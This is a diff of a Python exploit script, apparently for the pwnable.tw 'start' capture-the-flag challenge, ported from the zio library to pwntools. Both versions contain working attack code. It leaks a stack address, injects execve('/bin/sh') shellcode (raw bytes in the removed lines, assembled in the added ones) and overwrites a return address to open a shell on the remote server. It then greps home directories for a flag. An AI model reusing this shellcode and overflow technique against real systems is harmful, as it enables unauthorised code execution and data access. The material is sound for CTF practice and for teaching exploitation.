@@ -1,27 +1,36 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
-__Auther__ = 'M4x'
 
-from zio import *
-from sys import argv
+from pwn import *
+from time import sleep
+import sys
+context.binary = "./start"
 
-conn = ("./start") if argv[1] == "l" else ("chall.pwnable.tw", 10000)
-io = zio(conn, print_write = COLORED(RAW, "yellow"), print_read = COLORED(RAW, "red"), timeout = 10000)
+if sys.argv[1] == "l":
+    io = process("./start")
+else:
+    io = remote("chall.pwnable.tw", 10000)
 
-io.read_until(":")
-#  io.gdb_hint()
-io.write('0' * 20 + l32(0x8048087))
-#  io.read(size = 24)
-stack = b32(io.read(size=4)[::-1])
-print "\nstack -> {:#x}\n".format(stack)
+if __name__ == "__main__":
+    raw_input("DEBUG: ")
+    io.sendafter("CTF:", flat('0' * 20, 0x804808b))
+    stack = u32(io.recvuntil("\xff")[-4: ])
+    success("stack -> {:#x}".format(stack))
 
-shellcode = (
-    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31"
-    "\xc9\x89\xca\x6a\x0b\x58\xcd\x80"
-)
+    sc = asm('''
+            mov al, 11
+            xor ecx, ecx
+            xor edx, edx
+            mov ebx, esp
+            int 0x80
+            ''')
+    assert len(sc) <= 44
+    print hexdump(sc)
+    sleep(0.01)
+    io.send(fit({0x0: sc, 44: p32(stack - 0x1c)}, filler = '\x90') + "/bin/sh\0")
 
-io.write('1' * 20 + l32(stack + 0x14) + shellcode)
-#  io.write("aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmm")
+    if sys.argv[1] == "r":
+        io.sendline("cat /home/*/* |strings| grep -i flag")
+        print io.recv()
 
-io.interact()
-io.close()
+    io.interactive()
